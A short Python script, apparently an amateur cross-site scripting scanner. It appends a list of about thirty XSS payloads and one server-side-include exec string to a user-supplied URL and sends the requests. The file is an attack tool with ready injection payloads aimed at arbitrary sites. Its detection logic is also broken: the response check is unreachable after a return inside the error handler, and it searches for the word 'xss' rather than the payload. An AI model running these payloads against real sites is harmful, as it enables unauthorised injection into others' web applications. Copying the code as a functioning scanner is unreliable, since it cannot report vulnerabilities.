import requests
from colorama import Fore
URL = input("Url(id=): ")
print(Fore.YELLOW + "[WARNING]Payloads Starting.")
payloads = {
'xss': [
"-prompt(8)-",
"'-prompt(8)-'",
";a=prompt,a()//",
"';a=prompt,a()//",
"onclick=prompt(8)><svg/onload=prompt(8)>'@x.y",
"<image/src/onerror=prompt(8)>",
"<img/src/onerror=prompt(8)>",
"<image src/onerror=prompt(8)>",
"<img src/onerror=prompt(8)>",
"<image src =q onerror=prompt(8)>",
"<img src =q onerror=prompt(8)>",
"</scrip</script>t><img src =q", "onerror=prompt(8)>",
"<svg onload=alert(1)>",
"><svg onload=alert(1)//",
"onmouseover=alert(1)//",
"autofocus/onfocus=alert(1)//",
"'-alert(1)-'",
"'-alert(1)//",
"\'-alert(1)//",
"</script><svg onload=alert(1)>",
"<x contenteditable onblur=alert(1)>lose",
"<x onclick=alert(1)>click",
"<!-#exec cmd='cd /'>",
"<script>alert()</script>",
"<video onloadstart=alert(1)><source>",
"<input autofocus onblur=alert(1)>",
"<keygen autofocus onfocus=alert(1)>",
"<form onsubmit=alert(1)><input type=submit>",
"<select onchange=alert(1)><option>1<option>2",
"<img src='https://www.trendyol.com'>",
]
}
def test_payload(newURL, injection_type):
    try:
        response = requests.get(newURL)
        print(Fore.GREEN + "[INFO] Connection Established 200")
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[CRITICAL] Error: {e}")
        return False
        
        responseString = str(response.content)
        return injection_type in responseString
for injection_type, injection_values in payloads.items():
        	for payload in injection_values:
        		newURL = URL + payload
        		is_vulnerable = test_payload(newURL, injection_type)
        		if is_vulnerable:
        			print(Fore.GREEN + f"[INFO] Vulnerable Payload! : {payload}")
